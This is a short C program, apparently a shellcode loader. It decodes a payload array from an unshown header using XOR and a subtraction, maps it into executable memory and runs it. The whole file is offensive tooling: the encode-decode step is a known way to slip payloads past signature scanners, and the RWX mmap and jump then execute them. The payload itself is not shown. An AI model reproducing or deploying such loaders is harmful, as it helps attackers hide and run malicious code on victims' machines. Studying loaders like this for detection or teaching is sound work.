#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

#include "shellcode.h"


#define ADDKEY 42
#define XORKEY 0xbeef

typedef void* (*shellcode_t)();

int main(int argc, char ** argv) {

	size_t size = sizeof(code);// - 1;
	fprintf(stderr, "size of code: %zu\n", size);

	//now shellcode is loaded
	uint16_t *p;
	uint32_t sp;
	for (size_t i = 0; i < size / 2; i += 1) {
		p = ((uint16_t*) (code)) + i;
		*p ^= XORKEY;
		if (  *p - ADDKEY < 0) {
			sp = *p + 0xffff;
			*p = sp - ADDKEY;
		} else {
			*p -= ADDKEY;
		}
		
	}

	// write(1, code, size);

	uint8_t *ptr = mmap(0, size, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
 
    memcpy(ptr, code, size);
    shellcode_t sc = (shellcode_t) ptr;
 
    sc();

 
    return 0;
}
